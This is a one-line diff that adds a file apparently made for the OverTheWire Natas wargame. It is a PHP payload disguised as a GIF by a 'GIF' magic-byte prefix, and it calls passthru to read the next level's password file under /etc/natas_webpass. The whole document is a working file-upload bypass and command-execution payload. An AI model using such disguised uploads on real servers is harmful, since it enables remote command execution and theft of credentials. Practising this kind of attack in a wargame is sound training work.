@@ -1,0 +1,1 @@
+GIF<? print_r(passthru("cat /etc/natas_webpass/natas14")); ?>
